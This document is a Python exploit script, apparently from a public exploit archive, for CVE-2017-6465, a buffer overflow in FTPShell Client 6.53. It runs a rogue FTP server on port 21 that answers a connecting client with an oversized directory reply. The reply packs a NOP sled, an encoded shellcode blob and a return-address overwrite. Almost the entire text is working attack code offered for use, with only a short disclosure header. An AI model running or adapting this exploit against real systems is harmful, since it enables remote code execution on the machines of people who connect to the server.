# Exploit Title: FTPShell Client 6.53 buffer overflow on making initial connection
# Date: 2017-03-04
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Version: Windows Server 2008 R2 x64
# Tested on: Windows Server 2008 R2 Standard x64
# CVE: CVE-2017-6465

# 2017-03-04: Software vendor notified
# 2017-03-06: No reply
# 2017-03-06: Publishing

import socket
import sys

shell=("\xdd\xc4\xb8\xe6\xa1\xa8\x99\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x31\x31\x45\x18\x03\x45\x18\x83\xc5\xe2\x43\x5d\x65\x02\x01"
"\x9e\x96\xd2\x66\x16\x73\xe3\xa6\x4c\xf7\x53\x17\x06\x55\x5f"
"\xdc\x4a\x4e\xd4\x90\x42\x61\x5d\x1e\xb5\x4c\x5e\x33\x85\xcf"
"\xdc\x4e\xda\x2f\xdd\x80\x2f\x31\x1a\xfc\xc2\x63\xf3\x8a\x71"
"\x94\x70\xc6\x49\x1f\xca\xc6\xc9\xfc\x9a\xe9\xf8\x52\x91\xb3"
"\xda\x55\x76\xc8\x52\x4e\x9b\xf5\x2d\xe5\x6f\x81\xaf\x2f\xbe"
"\x6a\x03\x0e\x0f\x99\x5d\x56\xb7\x42\x28\xae\xc4\xff\x2b\x75"
"\xb7\xdb\xbe\x6e\x1f\xaf\x19\x4b\x9e\x7c\xff\x18\xac\xc9\x8b"
"\x47\xb0\xcc\x58\xfc\xcc\x45\x5f\xd3\x45\x1d\x44\xf7\x0e\xc5"
"\xe5\xae\xea\xa8\x1a\xb0\x55\x14\xbf\xba\x7b\x41\xb2\xe0\x11"
"\x94\x40\x9f\x57\x96\x5a\xa0\xc7\xff\x6b\x2b\x88\x78\x74\xfe"
"\xed\x77\x3e\xa3\x47\x10\xe7\x31\xda\x7d\x18\xec\x18\x78\x9b"
"\x05\xe0\x7f\x83\x6f\xe5\xc4\x03\x83\x97\x55\xe6\xa3\x04\x55"
"\x23\xc0\xcb\xc5\xaf\x29\x6e\x6e\x55\x36")

port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[i] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")



# 004b95dc in ftpshell.exe PUSH ESI ; RETN
eip = "\xdc\x95\x4b"
nops = "\x90"*8 
junk = "A"*(400-len(nops)-len(shell))
buffer = nops + shell + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to your unfriendly FTP server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
